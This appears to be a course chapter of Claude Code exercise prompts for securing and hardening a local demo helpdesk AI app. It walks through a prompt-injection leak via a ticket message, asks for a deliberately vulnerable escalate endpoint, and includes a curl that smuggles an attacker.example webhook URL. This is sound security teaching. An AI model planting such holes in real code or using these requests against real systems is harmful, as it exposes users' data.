# Chapter 6 — Dimension: Security and Reliability

Copy-paste prompts for the hands-on movies in this chapter. Each prompt works the same in **Claude Code CLI** (`cd` into the app, run `claude`, paste) and **Claude Code Desktop** (open the app folder, paste into the chat). Run the prompts in order.

> Reset an app to its starting state between exercises with `git restore . && git clean -fd` from inside the app folder. Run `npm install` once per app before its first exercise.


## 6.3 — Defend against prompt injection

**App:** `demos/helpdesk-ai`

**Prompt 1**

```text
Demonstrate the prompt-injection failure in the local helpdesk app, in the terminal. Do not write screenshots or report files.

With the dev server running, hit the vulnerable endpoint directly and print the raw response:
  curl -s -X POST http://localhost:3001/api/tickets/T-1006/suggest

Show me the `suggestion` field verbatim, then show me the message body in data/tickets.json that caused it, so the payload and the leak are side by side. Then classify the issue in concrete terms: where untrusted content enters, what private data is exposed, and what the exfiltration path would be with real tools attached. Do not fix yet.
```

**Prompt 2 — Then**

```text
Harden the Suggested Reply flow against this injection. Treat ticket messages as untrusted data, isolate them in the prompt, remove access the feature does not need, and add a runtime output guardrail that rejects leaked-email-list shaped responses. Add or update an eval that proves T-1006 no longer leaks — create `npm run evals` if this repo does not have it yet.

Then verify in the terminal, not by assertion: re-run the identical curl against `/api/tickets/T-1006/suggest` and print the before and after `suggestion` values one above the other. Finish with `npm run evals` and `npm run typecheck`. Do not write screenshots or report files.
```


## 6.4 — Scan AI code and secure the agent

**App:** `demos/helpdesk-ai`

**Prompt 1**

```text
Run a security review of this repo as it stands. Focus on AI feature risks, dependency risks, input validation, SSRF/exfiltration paths, and secrets handling.

Start with the dependency layer deterministically — run `npm audit` and report the advisories by severity, naming the package and whether it is a production or dev dependency. Then read the code for the logic-level problems audit cannot see, and give me file:line findings with a one-line exploit sketch each, sorted by severity. The unvalidated `/reply` body is the kind of concrete finding I want, not a vague "looks fine."

Print everything in the terminal. Do not write screenshots or report files, and do not fix yet.
```

**Prompt 2 — Then**

```text
Add a simple repo-local security gate command, `npm run security`, using lightweight checks that work offline for this demo — secrets in tracked files, `.env` hygiene, a raw-HTML sink, the AI output guardrail being wired, and CRITICAL production advisories from `npm audit` as a blocker with HIGH/MODERATE reported as warnings.

Run it before fixing anything and print exactly what it blocks on and why. Then fix the findings and run it again, printing a before/after summary in the terminal: checks failing before, checks failing after, one line per check that flipped. Also update CLAUDE.md with the agent security rules this repo should follow: no secrets in files, least privilege, validate inputs at trust boundaries, and run the security gate before claiming done. Do not write screenshots or report files.
```

**Prompt 3 — Then constrain the agent itself, not just its output**

```text
Set up least-privilege permissions for this repo in .claude/settings.json using the current Claude Code schema: allow the project's own scripts (typecheck, test, security, dev), deny destructive or out-of-scope commands, and default to read-only where a change is not needed. Explain each rule briefly and show the resulting config. Do not invent settings keys — if unsure of the current schema, tell me what to verify.
```


## 6.5 — Security: harden an AI-built endpoint

**App:** `demos/helpdesk-ai`

**Prompt 1 — First, plant the vulnerable endpoint and make the failure visible**

```text
Set up a security challenge. Add a plausible AI-built endpoint `POST /api/tickets/:id/escalate` that drafts an escalation note and posts to a webhook. Intentionally include three review findings: suspicious or nonexistent dependency, missing body validation, and caller-controlled webhook or over-broad access.

Then make each failure visible in the terminal, not just described. Run the install and `npm audit` and print what they say about the suspicious package. Then send an actual abusive request and print the full response including the status code:
  curl -s -i -X POST http://localhost:3001/api/tickets/T-1001/escalate -H 'content-type: application/json' -d '{"note":"hi","webhookUrl":"http://attacker.example/collect","admin":true,"junk":"<4000 chars>"}'

I want to see the smuggled webhook and the unknown fields accepted. Do not fix it, and do not write screenshots or report files.
```

**Prompt 2 — Then harden it, mapping each fix to its finding**

```text
Harden the `POST /api/tickets/:id/escalate` endpoint. Remove or replace the suspicious dependency, add strict schema validation with bounds and unknown-field rejection, remove caller-controlled webhook behavior, and scope the handler to the minimum ticket data it needs. Add tests/security checks for each fix.

Verify in the terminal: re-send the identical abusive curl and print the status code and body — I expect a 400 — directly under what it returned before. Then run the install, `npm audit`, `npm run security` (create it if this repo does not have it yet), `npm run test`, and `npm run typecheck`, and print a finding -> fix -> verification table, one row per finding. Do not write screenshots or report files.
```

**Prompt 3 — Then adjudicate the green with an independent critic — do not let the author grade its own work**

```text
Create a fresh-context reviewer subagent (.claude/agents/reviewer.md) whose only job is adversarial security review. Give it the diff for the escalate endpoint and the three original findings, and instruct it to actively try to break the fix: bypass the validation, influence the webhook target, confirm the dependency is truly gone. It must not assume the fix is correct. Run it and report only what it can actually break, with file:line. If it finds nothing, say so explicitly.
```


## 6.6 — Instrument and harden an AI feature

**App:** `demos/helpdesk-ai`

**Prompt 1**

```text
Measure the failure before fixing it. Do not write screenshots or report files — print everything in the terminal.

Instrument the AI Suggested Reply path for reliability: lightweight in-memory telemetry around the model call recording latency (avg/p95), attempts, error count, fallback count, and degraded=true when a fallback is used. Expose the snapshot as `GET /api/metrics` so I can read it with curl.

Then force the model path to fail (wrap the offline mock so it throws — no network, no API key) and drive the endpoint:
  curl -s -X POST http://localhost:3001/api/tickets/T-1001/suggest -w '\nHTTP %{http_code} in %{time_total}s\n'
  curl -s http://localhost:3001/api/metrics

Report the status code, the wall-clock time, and the metrics JSON. Do not harden anything yet — I want the broken baseline on screen.
```

**Prompt 2 — Then**

```text
Now harden the model call: timeout, safe retry where it is actually safe, circuit breaker for repeated failures, a deterministic template fallback, and output validation that rejects empty or unsafe replies.

With the model path still failing, re-run the identical two curl commands and print a before/after table in the terminal: status code, response time, fallback count, degraded flag. Do not call this done until the endpoint returns fast with a usable fallback and the telemetry says degraded. Do not write screenshots or report files. Finish with `npm run typecheck` and any reliability tests you added.
```

